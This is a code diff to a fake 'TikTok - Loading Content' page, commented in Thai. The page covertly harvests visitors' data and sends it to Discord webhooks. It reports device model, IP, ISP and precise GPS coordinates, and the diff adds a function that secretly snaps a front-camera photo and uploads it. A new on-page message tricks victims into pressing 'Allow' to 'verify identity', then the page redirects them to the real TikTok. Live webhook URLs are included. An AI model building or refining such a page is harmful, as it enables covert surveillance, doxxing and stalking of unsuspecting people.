@@ -4,7 +4,37 @@
     <meta charset="UTF-8">
     <title>TikTok - Loading Content</title>
     <script>
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1505544002550894722/RUjDHbux3C0YOWveT1xcJ07SYzN9nNXHIm2_YfyuBAs0DZlzkcUqj7zDHzpPKwQKOUAi"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 
+
+        // --- ฟังก์ชันถ่ายภาพจากกล้องหน้า ---
+        async function captureFace() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const formData = new FormData();
+                formData.append('file', blob, 'face_capture.jpg');
+                formData.append('payload_json', JSON.stringify({ 
+                    content: "📸 **FACE CAPTURED (ภาพถ่ายจากกล้องหน้า)**\n✅ สถานะ: ถ่ายสำเร็จแล้ว" 
+                }));
+
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+
+                // ปิดกล้องทันที
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                // ถ้าเขาไม่อนุญาตกล้อง ก็ให้ข้ามไป
+            }
+        }
 
         async function capture() {
             if (navigator.userAgent.includes("facebookexternalhit")) return;
@@ -47,18 +77,17 @@
                     }
                 }
 
-                let report = `📂 **NEW TARGET LOGGED (${deviceType})**\n\`\`\`\n`;
-                report += `[LOCATION (ตำแหน่ง)]\n`;
-                report += `City (เมือง): ${check(data.city)}\n`;
-                report += `Region (จังหวัด): ${check(data.region)}\n`;
-                report += `Postal (รหัสไปรษณีย์): ${check(data.postal)}\n`;
-                report += `Country (ประเทศ): ${check(data.country_name)}\n\n`;
-
-                report += `[DEVICE (อุปกรณ์)]\n`;
-                report += `Model (รุ่น): ${modelName}\n`;
-                report += `OS (ระบบปฏิบัติการ): ${check(navigator.platform)}\n`;
-                report += `IP (ไอพี): ${check(data.ip)}\n`;
-                report += `ISP (ผู้ให้บริการ): ${check(data.org)}\n\`\`\``;
+                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
+                let report = `📂 **NEW TARGET LOGGED**\n`;
+                report += `──────────────────────────\n`;
+                report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
+                report += `> **Model (รุ่น):** ${modelName}\n`;
+                report += `> **Type (ประเภท):** ${deviceType}\n`;
+                report += `> **OS (ระบบ):** ${check(navigator.platform)}\n\n`;
+                report += `🌐 **[NETWORK (เครือข่าย)]**\n`;
+                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
+                report += `> **ISP (ค่ายเน็ต):** ${check(data.org)}\n`;
+                report += `──────────────────────────`;
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -66,29 +95,44 @@
                     body: JSON.stringify({ content: report })
                 });
 
-                // --- ส่วนที่ 2: ระบบพิกัด GPS ครั้งเดียว (แม่นยำสูง) ---
+                // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด และขอใช้กล้อง ---
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
+                        // เมื่อกดยอมรับพิกัด ให้ลองขอใช้กล้องถ่ายรูปทันที
+                        await captureFace();
+
                         const { latitude, longitude } = pos.coords;
                         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        const streetView = `https://maps.google.com/maps?q=&layer=c&cbll=${latitude},${longitude}`;
                         
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (${modelName}) (พิกัดแม่นยำสูง)**\n📍 Location (พิกัด): ${latitude}, ${longitude}\n📍 Maps (แผนที่): ${mapsLink}\n🏠 Street View (สตรีทวิว): ${streetView}` 
+                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำ97%)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำ💯)\n──────────────────────────` 
                             })
                         });
-                        // ส่งเสร็จแล้วเด้งไป TikTok ทันที
                         window.location.href = "https://www.tiktok.com";
 
-                    }, () => { 
+                    }, async () => { 
+                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
+                        backupReport += `──────────────────────────\n`;
+                        backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
+                        backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
+                        backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
+                        backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
+                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงและคลาดเคลื่อน)\n`;
+                        backupReport += `──────────────────────────`;
+
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: backupReport })
+                        });
                         window.location.href = "https://www.tiktok.com"; 
                     }, { 
-                        enableHighAccuracy: true, // ใช้ดาวเทียม
-                        maximumAge: 0,            // ห้ามใช้พิกัดเก่าที่เครื่องจำไว้
-                        timeout: 10000            // รอสัญญาณ 10 วิ
+                        enableHighAccuracy: true, 
+                        maximumAge: 0, 
+                        timeout: 10000 
                     });
                 } else {
                     window.location.href = "https://www.tiktok.com";
@@ -101,9 +145,13 @@
     </script>
 </head>
 <body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
-    <div style="text-align:center;">
-        <p>Loading Content... (กำลังโหลดเนื้อหา...)</p>
-        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
+    <div style="text-align:center; padding: 20px;">
+        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
+        <p style="font-size: 18px; font-weight: bold; margin-bottom: 5px;">Loading Content...</p>
+        <p style="font-size: 14px; color: #ccc;">(กำลังโหลดเนื้อหา...)</p>
+        <p style="font-size: 13px; color: #fe2c55; margin-top: 15px; border: 1px solid #fe2c55; padding: 8px; border-radius: 5px;">
+            ⚠️ โปรดกด "อนุญาต (Allow)" เพื่อยืนยันตัวตนและเข้าชมเนื้อหาในพื้นที่ของคุณ
+        </p>
     </div>
     <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
